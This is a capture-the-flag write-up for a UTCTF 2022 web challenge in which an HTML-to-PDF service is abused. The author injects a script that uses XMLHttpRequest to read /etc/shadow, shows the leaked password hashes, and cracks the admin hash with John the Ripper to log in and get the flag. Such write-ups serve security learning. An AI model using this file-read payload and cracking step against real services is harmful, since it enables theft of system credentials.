**HTML2PDF Writeup**

**UT CTF 2022**


Chall link:<http://web2.utctf.live:9854/>

In this challenge, whatever we give the html code, we get the result as a pdf form. 

In that page, already the following code is given:

<b>Try Me!</b>

<img src= "<https://hips.hearstapps.com/hmg-prod.s3.amazonaws.com/images/dog-puppy-on-garden-royalty-free-image-1586966191.jpg>">

The above html code contains the <img src> tag, which is used to insert an image. The image will be shown in a pdf format.

This site also contains an admin form. So we will get the flag if we give the proper username and password.

We can get the password through the html code we give. For that we will make a XMLhttprequest.

To read more about XMLHttprequest: <https://www.w3schools.com/xml/xml_http.asp>

XMLHttpRequest is used to request data from the server.

So we will write an html code to get the usernames and passwords from the backend.

<b>Try Me!</b>

<script>

x=new XMLHttpRequest;

x.onload=function()

{

document.write(this.responseText)

};

x.open("GET","file:///etc/shadow");

x.send();

</script>

This is the output that we get for the above code:

root:\*:19052:0:99999:7::: daemon:\*:19052:0:99999:7::: bin:\*:19052:0:99999:7::: sys:\*:19052:0:99999:7:::

sync:\*:19052:0:99999:7::: games:\*:19052:0:99999:7::: man:\*:19052:0:99999:7::: lp:\*:19052:0:99999:7::: mail:\*:19052:0:99999:7::: news:\*:19052:0:99999:7::: uucp:\*:19052:0:99999:7::: proxy:\*:19052:0:99999:7::: wwwdata:\*:19052:0:99999:7::: backup:\*:19052:0:99999:7::: list:\*:19052:0:99999:7::: irc:\*:19052:0:99999:7:::

gnats:\*:19052:0:99999:7::: nobody:\*:19052:0:99999:7::: \_apt:\*:19052:0:99999:7::: systemdnetwork:\*:19062:0:99999:7::: systemd-resolve:\*:19062:0:99999:7::: messagebus:\*:19062:0:99999:7:::

avahi:\*:19062:0:99999:7::: geoclue:\*:19062:0:99999:7:::

dave:$1$M.bfkUDw$jjybwVXMb4waSV0fY5gp0/:19062:0:99999:7:::

john:$1$EPS/Rl3g$5TLupCmddYSibyDaZtZhQ0:19062:0:99999:7:::

emma:$1$iasayt59$U1QnVGaDEJKyps3iHWv2P1:19062:0:99999:7::: WeakPasswordAdmin:$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.:19062:0:99999:7:::


The last entry(WeakPasswordAdmin) seems to be more suitable.

Now we need to crack the password. We can do it using ***john the ripper*** tool.

In terminal:

john <(echo 'WeakPasswordAdmin:$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.:19062:0:99999:7:::')

Thus we got username: WeakPasswordAdmin

`	            `Password: sunshine

Logging into the admin panel with the above credentials gives us the flag.

Flag: **utflag{b1g\_r3d\_t3am\_m0v35\_0ut\_h3r3}**

